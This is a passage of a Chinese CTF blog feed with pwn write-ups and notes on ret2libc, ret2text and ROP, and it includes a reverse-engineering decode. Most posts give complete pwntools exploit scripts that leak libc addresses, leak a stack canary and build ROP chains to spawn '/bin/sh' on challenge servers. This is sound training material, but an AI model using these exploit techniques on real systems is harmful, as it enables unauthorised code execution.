<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">r.recvuntil(<span class="string">&#x27;How many bytes do you want me to read?&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x2c</span>+<span class="number">4</span>)+p32(printf_plt)+p32(main)+p32(printf_got)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">printf_addr=u32(r.recv(<span class="number">4</span>))</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;printf&#x27;</span>,printf_addr)</span><br></pre></td></tr></table></figure>

<p>算出system和’/bin/sh’的地址</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">offset=printf_addr-libc.dump(<span class="string">&#x27;printf&#x27;</span>)</span><br><span class="line">system=offset+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh=offset+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>覆盖返回地址，夺权</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">r.recvuntil(<span class="string">&#x27;How many bytes do you want me to read?&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x2c</span>+<span class="number">4</span>)+p32(system)+p32(main)+p32(bin_sh)</span><br><span class="line">r.sendline(payload)</span><br></pre></td></tr></table></figure>

<h3 id="exp："><a href="#exp：" class="headerlink" title="exp："></a>exp：</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from LibcSearcher import *</span></span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25624</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn2_sctf_2016&#x27;</span>)</span><br><span class="line"></span><br><span class="line">printf_plt=elf.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">printf_got=elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">main=elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;How many bytes do you want me to read? &#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x2c</span>+<span class="number">4</span>)+p32(printf_plt)+p32(main)+p32(printf_got)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">printf_addr=u32(r.recv(<span class="number">4</span>))</span><br><span class="line"><span class="comment">#libc=LibcSearcher(&#x27;printf&#x27;,printf_addr)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line">offset=printf_addr-libc.sym[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">system=offset+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh=offset+ <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;How many bytes do you want me to read? &#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x2c</span>+<span class="number">4</span>)+p32(system)+p32(main)+p32(bin_sh)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="/img/image-20210706132149436.png" alt="image-20210706132149436"></p>
]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>ret2libc</title>
    <url>/2021/06/20/ret2libc/</url>
    <content><![CDATA[<span id="more"></span>
<h1 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h1><p>libc是Linux下的ANSIC的函数库。</p>
<p>ret2libc 即控制函数的执行 libc 中的函数，通常是返回至某个函数的 plt 处或者函数的具体位置 (即函数对应的 got 表项的内容)。一般情况下，我们会选择执行 system(“/bin/sh”)，故而此时我们需要知道 system 函数的地址。</p>
<h3 id="非执行堆栈"><a href="#非执行堆栈" class="headerlink" title="非执行堆栈"></a>非执行堆栈</h3><p>非执行堆栈是为避免堆或者堆栈的内存区域被植入恶意代码执行，当然也可以直接防止一部分内存被写入恶意代码。换句话说，这是个防止缓冲区溢出的功能。</p>
<p>当checksec发现NX(No-eXecute)开启后，其实就已经是非执行堆栈了，这时候就需要用到libc库。</p>
<h5 id="libc是怎么来的：不再用指令覆盖EIP，直接调用libc库中我们需要的函数覆盖"><a href="#libc是怎么来的：不再用指令覆盖EIP，直接调用libc库中我们需要的函数覆盖" class="headerlink" title="libc是怎么来的：不再用指令覆盖EIP，直接调用libc库中我们需要的函数覆盖"></a>libc是怎么来的：不再用指令覆盖EIP，直接调用libc库中我们需要的函数覆盖</h5><p>思路：</p>
<p>1.泄露 一个调用函数的 地址</p>
<p>2.获取 libc 版本</p>
<p>3.获取 system 地址与 /bin/sh 的地址</p>
<p>4.再次执行源程序</p>
<p>5.触发栈溢出执行 system(‘/bin/sh’)</p>
<p>shellcode结构：</p>
<p><img src="/img/shellcode.png"></p>
<p>正常堆栈布局：</p>
<p><img src="/img/1.png"></p>
<p>ret2libc执行system的堆栈布局：</p>
<p><img src="/img/2.png"></p>
<p>具体例题可以查看[OGeek2019]babyrop的writeup。</p>
<p>平常的shellcode在源程序里就能找到system函数和/bin/sh，而ret2libc类型的题差别就在这里，我们需要通过libc库查找到system函数和/bin/sh在源程序中的位置，然后才能构造shellcode进行夺权，最后拿下flag。</p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>jarvisoj_level3_x64</title>
    <url>/2021/07/11/level3-x64/</url>
    <content><![CDATA[<h1 id="jarvisoj-level3-x64"><a href="#jarvisoj-level3-x64" class="headerlink" title="jarvisoj_level3_x64"></a>jarvisoj_level3_x64</h1><p>检查保护机制，64位，开NX</p>
<p><img src="/img/image-20210711122341042.png" alt="image-20210711122341042"></p>
<p>IDA打开，</p>
<p>main函数</p>
<p><img src="/img/image-20210711123946252.png" alt="image-20210711123946252"></p>
<p>发现function函数，找到栈溢出漏洞</p>
<p><img src="/img/image-20210711124005975.png" alt="image-20210711124005975"></p>
<p>写入长度为7，读的长度为0x200</p>
<h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>1.泄露read地址得到libc版本</p>
<p>2.获取system和‘/bin/sh’的地址</p>
<p>3.返回主函数进行夺权</p>
<h3 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h3><p>因为是64位，所以考虑寄存器问题</p>
<p>需要构造write(1, read_got, 8)，即将rdi=1<code>，</code>rsi=read_got<code>，</code>rdx=8</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary level3_x64 --only “pop|ret”</span><br></pre></td></tr></table></figure>

<p><img src="/img/image-20210711132937061.png" alt="image-20210711132937061"></p>
<p>利用出栈指令<code>pop</code>给对应的寄存器赋值，但这里没有<code>pop rdx</code>，通过查看反汇编可以发现构造栈溢出前<code>rdx=0x200</code>，足够将<code>read</code>函数的真实地址泄露出来</p>
<p>第二次栈溢出跳转执行<code>system(&quot;/bin/sh&quot;)</code></p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os = <span class="string">&quot;linux&quot;</span>, arch = <span class="string">&quot;amd64&quot;</span>, log_level= <span class="string">&quot;debug&quot;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">29641</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./level3_x64&quot;</span>)</span><br><span class="line"></span><br><span class="line">read_got = elf.got[<span class="string">&quot;read&quot;</span>]</span><br><span class="line">write_plt = elf.plt[<span class="string">&quot;write&quot;</span>]</span><br><span class="line">main_addr = elf.symbols[<span class="string">&quot;main&quot;</span>]</span><br><span class="line">pop_rdi_ret = <span class="number">0x4006b3</span></span><br><span class="line">pop_rsi_r15_ret = <span class="number">0x4006b1</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span> * <span class="number">0x88</span></span><br><span class="line">payload += p64(pop_rdi_ret) + p64(<span class="number">1</span>)						<span class="comment">#设置write第一个参数为1</span></span><br><span class="line">payload += p64(pop_rsi_r15_ret) + p64(read_got) + p64(<span class="number">0</span>)	<span class="comment">#设置write第二个参数为read_got</span></span><br><span class="line">payload += p64(write_plt)									<span class="comment">#调用write函数</span></span><br><span class="line">payload += p64(main_addr)									<span class="comment">#调用完write返回主函数</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Input:&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">read_addr = u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))	<span class="comment">#接收泄露的read函数的真实地址</span></span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;read&quot;</span>, read_addr)</span><br><span class="line">libc_base = read_addr - libc.dump(<span class="string">&quot;read&quot;</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line">binsh_addr = libc_base + libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span> * <span class="number">0x88</span></span><br><span class="line">payload += p64(pop_rdi_ret) + p64(binsh_addr)</span><br><span class="line">payload += p64(system_addr)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Input:&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/img/image-20210711133802398.png" alt="image-20210711133802398"></p>
]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>ret2text</title>
    <url>/2021/06/20/ret2text/</url>
    <content><![CDATA[<span id="more"></span>
<h1 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h1><p>ret2text 即控制程序执行程序本身已有的的代码 (.text),使EIP指向具有system(“/bin/sh”)的代码段。<br>其实，这种攻击方法是一种笼统的描述。我们控制执行程序已有的代码的时候也可以控制程序执行好几段不相邻的程序已有的代码 (也就是 gadgets)，这就是我们所要说的 ROP。</p>
<p>这时，我们需要知道对应返回的代码的位置。当然程序也可能会开启某些保护，我们需要想办法去绕过这些保护。</p>
<h2 id="例题：-HarekazeCTF2019-baby-rop-ret2text"><a href="#例题：-HarekazeCTF2019-baby-rop-ret2text" class="headerlink" title="例题： [HarekazeCTF2019]baby_rop(ret2text)"></a>例题： [HarekazeCTF2019]baby_rop(ret2text)</h2><p>先查壳，开了NX，64位</p>
<p><img src="/img/image-20210620201226614.png" alt="image-20210620201226614"></p>
<p>IDA打开，F5查看main函数</p>
<p><img src="/img/image-20210620201505692.png" alt="image-20210620201505692"></p>
<p><img src="/img/image-20210620201559551.png" alt="image-20210620201559551"></p>
<p>看见system函数</p>
<p>然后F12+shift搜索字符串，还找到了’/bin/sh/‘</p>
<p><img src="/img/image-20210620201708611.png" alt="image-20210620201708611"></p>
<p><img src="/img/image-20210620202004923.png" alt="image-20210620202004923"></p>
<p>因为64位传参需要用到寄存器，所以用gadget找到rdi寄存器位置</p>
<p><img src="/img/image-20210620202405923.png" alt="image-20210620202405923"></p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight moonscript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"># <span class="built_in">io</span> = process(<span class="string">&#x27;./babyrop&#x27;</span>)</span><br><span class="line"><span class="built_in">io</span> = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="string">&#x27;28379&#x27;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./babyrop&#x27;</span>)</span><br><span class="line"></span><br><span class="line">binsh_addr = <span class="number">0x601048</span></span><br><span class="line">system_addr = e.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">pop_rdi = <span class="number">0x400683</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">io</span>.recvuntil(<span class="string">&#x27;your name?&#x27;</span>)</span><br><span class="line">payload = <span class="number">0x18</span> * b<span class="string">&#x27;a&#x27;</span> + p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)</span><br><span class="line"><span class="built_in">io</span>.sendline(payload)</span><br><span class="line"><span class="built_in">io</span>.interactive()</span><br></pre></td></tr></table></figure>

<p>这里夺权之后还有一个小坑，就是flag不在根目录下，需要通过查找获得位置，然后拿到flag</p>
<p><img src="/img/image-20210620202949778.png" alt="image-20210620202949778"></p>
<p>这是属于最简单的例题，稍微难一点的会涉及到计算地址偏移量。</p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>picoctf_2018_rop</title>
    <url>/2021/07/17/picoctf-2018-rop/</url>
    <content><![CDATA[<h1 id="picoctf-2018-rop-chain"><a href="#picoctf-2018-rop-chain" class="headerlink" title="picoctf_2018_rop chain"></a>picoctf_2018_rop chain</h1><p>检查保护机制，32位，开NX</p>
<p><img src="/img/image-20210717100253970.png" alt="image-20210717100253970"></p>
<p>IDA打开</p>
<p>main函数，里面发现vuln函数</p>
<p><img src="/img/image-20210717100706788.png" alt="image-20210717100706788"></p>
<p><img src="/img/image-20210717100744059.png" alt="image-20210717100744059"></p>
<h4 id="漏洞点：没有限制输入字符串长度"><a href="#漏洞点：没有限制输入字符串长度" class="headerlink" title="漏洞点：没有限制输入字符串长度"></a>漏洞点：没有限制输入字符串长度</h4><p>然后发现了一个flag函数，仔细查看后发现这是一个后门函数</p>
<p><img src="/img/image-20210717101317225.png" alt="image-20210717101317225"></p>
<p>win_function1函数</p>
<p><img src="/img/image-20210717101703475.png" alt="image-20210717101703475"></p>
<p>win_function2函数</p>
<p><img src="/img/image-20210717101752632.png" alt="image-20210717101752632"></p>
<h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line">需要注意点就是，有个判断 条件<span class="keyword">if</span> <span class="comment">( win1 &amp;&amp; win2 &amp;&amp; a1 == -559039827 )</span>，需要控制wi<span class="symbol">n1</span>、wi<span class="symbol">n2</span>、a<span class="number">1</span></span><br><span class="line">wi<span class="symbol">n1</span>、wi<span class="symbol">n2</span>可以通过调用对应的函数进行赋值，而a<span class="number">1</span>是作为flag函数的参数，在栈上构造好数据即可</span><br></pre></td></tr></table></figure>

<p>先对win1赋值，使win1=1</p>
<p>然后当win_function2的参数a1=-1163220307，对win2进行赋值，win2=1</p>
<h3 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h3><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os = <span class="string">&quot;linux&quot;</span>, arch = <span class="string">&quot;i386&quot;</span>, log_level= <span class="string">&quot;debug&quot;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">28400</span>)</span><br><span class="line"></span><br><span class="line">win_function1 = <span class="number">0x080485CB</span></span><br><span class="line">win_function2 = <span class="number">0x080485D8</span></span><br><span class="line">flag = <span class="number">0x0804862B</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span> * <span class="number">0x1c</span></span><br><span class="line">payload += p32(win_function1)</span><br><span class="line">payload += p32(win_function2) + p32(flag) + p32(<span class="number">0xBAAAAAAD</span>) + p32(<span class="number">0xDEADBAAD</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;input&gt; &quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="注："><a href="#注：" class="headerlink" title="注："></a>注：</h4><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">0xBAAAAAAD</span>是-<span class="number">1163220307</span>对应的<span class="number">16</span>进制的补码作为win_function<span class="number">2</span>函数的参数</span><br><span class="line"><span class="attribute">0xDEADBAAD</span>是-<span class="number">559039827</span>对应的<span class="number">16</span>进制的补码作为flag函数的参数</span><br></pre></td></tr></table></figure>

<p><img src="/img/image-20210717103414365.png" alt="image-20210717103414365"></p>
]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>基本ROP</title>
    <url>/2021/06/20/%E5%9F%BA%E6%9C%ACROP/</url>
    <content><![CDATA[<h1 id="基本ROP"><a href="#基本ROP" class="headerlink" title="基本ROP"></a>基本ROP</h1><p>随着 NX 保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是 ROP(Return Oriented Programming)，其主要思想是在栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。所谓 gadgets 就是以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。</p>
<p>之所以称之为 ROP，是因为核心在于利用了指令集中的 ret 指令，改变了指令流的执行顺序。ROP 攻击一般得满足如下条件</p>
<pre><code>程序存在溢出，并且可以控制返回地址。

可以找到满足条件的 gadgets 以及相应 gadgets 的地址。
</code></pre>
<p>如果 gadgets 每次的地址是不固定的，那我们就需要想办法动态获取对应的地址了。</p>
<h2 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>ret2text 即控制程序执行程序本身已有的的代码 (.text)。其实，这种攻击方法是一种笼统的描述。我们控制执行程序已有的代码的时候也可以控制程序执行好几段不相邻的程序已有的代码 (也就是 gadgets)，这就是我们所要说的 ROP。</p>
<p>这时，我们需要知道对应返回的代码的位置。当然程序也可能会开启某些保护，我们需要想办法去绕过这些保护。</p>
<h2 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>ret2shellcode，即控制程序执行 shellcode 代码。shellcode 指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的 shell。一般来说，shellcode 需要我们自己填充。这其实是另外一种典型的利用方法，即此时我们需要自己去填充一些可执行的代码。</p>
<p>在栈溢出的基础上，要想执行 shellcode，需要对应的 binary 在运行时，shellcode 所在的区域具有可执行权限。</p>
<h2 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h2><h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><p>ret2syscall，即控制程序执行系统调用，获取 shell。</p>
<h2 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h2><h3 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h3><p>ret2libc 即控制函数的执行 libc 中的函数，通常是返回至某个函数的 plt 处或者函数的具体位置 (即函数对应的 got 表项的内容)。一般情况下，我们会选择执行 system(“/bin/sh”)，故而此时我们需要知道 system 函数的地址。</p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>pwn、笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>xjusec考核赛</title>
    <url>/2021/08/26/xjusec%E8%80%83%E6%A0%B8%E8%B5%9B/</url>
    <content><![CDATA[<h1 id="xjusec考核赛wp"><a href="#xjusec考核赛wp" class="headerlink" title="xjusec考核赛wp"></a>xjusec考核赛wp</h1><h2 id="REVERSE："><a href="#REVERSE：" class="headerlink" title="REVERSE："></a>REVERSE：</h2><h3 id="justbase64"><a href="#justbase64" class="headerlink" title="justbase64"></a>justbase64</h3><p>这个题是以前看见过的一个类似的题，ida打开</p>
<p><img src="/img/image-20210825211051630.png" alt="image-20210825211051630"></p>
<p>这边目录看见encode_one,encode_two,encode_three三个编码，右边主函数里就是三次编码后形成的”EmBmP5Pmn7QcPU4gLYKv5QcMmB3PWHcP5YkPq3=cT6QckkPckoRG”，题目也有提示base64，但肯定不只有base64</p>
<p>挨个看，在encode_one里面发现一个变量alphabet，肯定了base64的存在</p>
<p><img src="/img/image-20210825211343129.png" alt="image-20210825211343129"></p>
<p>encode_two里面关系一张图解释</p>
<p><img src="/img/image-20210825211513679.png" alt="image-20210825211513679"></p>
<p><img src="/img/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20210825211744.jpg"></p>
<p>就是这样的一个对应关系</p>
<p>encode_three就是有个移位的问题</p>
<p><img src="/img/image-20210825211933760.png" alt="image-20210825211933760"></p>
<p><img src="/img/20200911131956308.png"></p>
<p>要还原就从three开始倒过来还原</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">m</span>(<span class="params">v5</span>):</span></span><br><span class="line">    <span class="keyword">if</span> v5 &lt;= <span class="number">64</span> <span class="keyword">or</span> v5 &gt; <span class="number">90</span>:</span><br><span class="line">        <span class="keyword">if</span> v5 &lt;= <span class="number">96</span> <span class="keyword">or</span> v5 &gt; <span class="number">122</span>:</span><br><span class="line">            <span class="keyword">if</span> v5 &lt;= <span class="number">47</span> <span class="keyword">or</span> v5 &gt; <span class="number">57</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">chr</span>(v5)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">chr</span>((v5 - <span class="number">45</span>) % <span class="number">10</span> + <span class="number">48</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">chr</span>((v5 - <span class="number">94</span>) % <span class="number">26</span> + <span class="number">97</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">chr</span>((v5 - <span class="number">62</span>) % <span class="number">26</span> + <span class="number">65</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mm = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>, <span class="number">127</span>):</span><br><span class="line">    raw = i</span><br><span class="line">    fin = m(i)</span><br><span class="line">    mm[fin] = <span class="built_in">chr</span>(raw)</span><br><span class="line"></span><br><span class="line">data = <span class="string">&quot;EmBmP5Pmn7QcPU4gLYKv5QcMmB3PWHcP5YkPq3=cT6QckkPckoRG&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(mm)</span><br><span class="line">fin2 = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> data:</span><br><span class="line">    fin2 += mm[c]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(fin2)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/img/image-20210825212900481.png" alt="image-20210825212900481"></p>
<p>再还原two，最后base64解码得到flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">data = <span class="string">&quot;BjYjM2Mjk4NzMR1dIVHs2NzJjY0MTEzM2VhMn0=zQ3NzhhMzhlOD&quot;</span></span><br><span class="line"></span><br><span class="line">raw = [<span class="string">&quot;0&quot;</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">38</span>)]</span><br><span class="line"></span><br><span class="line">raw[<span class="number">0</span>: <span class="number">13</span>] = data[<span class="number">13</span>: <span class="number">26</span>]</span><br><span class="line">raw[<span class="number">13</span>: <span class="number">26</span>] = data[<span class="number">39</span>: <span class="number">52</span>]</span><br><span class="line">raw[<span class="number">26</span>: <span class="number">39</span>] = data[<span class="number">0</span>: <span class="number">13</span>]</span><br><span class="line">raw[<span class="number">39</span>: <span class="number">52</span>] = data[<span class="number">26</span>: <span class="number">39</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(base64.b64decode(<span class="string">&quot;&quot;</span>.join(raw).encode()).decode())</span><br></pre></td></tr></table></figure>



<h2 id="pwn："><a href="#pwn：" class="headerlink" title="pwn："></a>pwn：</h2><h3 id="ez-pwn（partial-overwrite-部分覆盖）"><a href="#ez-pwn（partial-overwrite-部分覆盖）" class="headerlink" title="ez_pwn（partial overwrite 部分覆盖）"></a>ez_pwn（partial overwrite 部分覆盖）</h3><p>这个题我觉得一点也不简单，在拿到hint之后才借助互联网的力量把他弄出来，过程艰辛</p>
<p><img src="/img/image-20210825212508971.png" alt="image-20210825212508971"></p>
<p><img src="/img/image-20210825214242973.png" alt="image-20210825214242973"></p>
<p>一种比较新鲜的栈溢出，叫 <strong>花式栈溢出</strong> </p>
<p>partial overwrite：在开启了PIE后，无论高位地址如何变化，低位地址是不变的，意味着有概率“撞到”正确的地址</p>
<p><img src="/img/image-20210825213240232.png" alt="image-20210825213240232"></p>
<p>主要的问题就是开启了canary，而栈溢出在第二次read函数里，有canary保护 ，read读满不会追加\0 。可以计算出第一次 read 需要的长度为 0x30 - 0x8 + 1 (+ 1 是为了覆盖 canary 的最低位为非 0 的值, printf 使用 %s 时, 遇到 \0 结束, 覆盖 canary 低位为非 0 值时, canary 就可以被 printf 打印出来了)</p>
<p><img src="/img/image-20210825213949666.png" alt="image-20210825213949666"></p>
<p>同时也发现了夺权函数，那么第二次栈溢出只要返回到夺权函数地址就行了</p>
<p>最后脚本多次的尝试才拿到了flag，因为返回地址与 get shell 函数的地址只有低位的 16 bit 不同, 如果覆写低 16 bit 为<code>0x0A3E</code>, 就有一定的几率 get shell</p>
<h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    io=remote(<span class="string">&quot;175.24.233.124&quot;</span>,<span class="number">10001</span>)</span><br><span class="line">    <span class="comment">#io=process(&#x27;./ez_pwn&#x27;,timeout=1)</span></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Name:\n&#x27;</span>)</span><br><span class="line">    payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x28</span>)</span><br><span class="line">    io.sendline(payload)</span><br><span class="line">    io.recvuntil(payload+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">    canary=u64(io.recvn(<span class="number">7</span>).rjust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;canary:&#x27;</span>+<span class="built_in">hex</span>(canary))</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;:\n&#x27;</span>)</span><br><span class="line">    payload=<span class="string">b&#x27;A&#x27;</span>*<span class="number">0x28</span>+p64(canary)+<span class="string">b&#x27;A&#x27;</span>*<span class="number">8</span>+<span class="string">b&#x27;\x3E\x0A&#x27;</span></span><br><span class="line">    io.send(payload)</span><br><span class="line">    io.interactive()</span><br><span class="line">    io.close()</span><br></pre></td></tr></table></figure>



<h3 id="mid-pwn"><a href="#mid-pwn" class="headerlink" title="mid_pwn"></a>mid_pwn</h3><p><img src="/img/image-20210825214846902.png" alt="image-20210825214846902"></p>
<p>ida打开后，看见menu函数，五个功能</p>
<p>Create_Heap函数</p>
<p><img src="/img/image-20210825215031703.png" alt="image-20210825215031703"></p>
<p>读完后发现有两次malloc，就意味着申请了两次，第一个chunk可以看作是记录的作用，里面存放着第二个chunk的size和指针，同时，第一个chunk的地址指针保存在bss段中heaparray数组这里，两个大小都是0x20的chunk，举个例子方便理解</p>
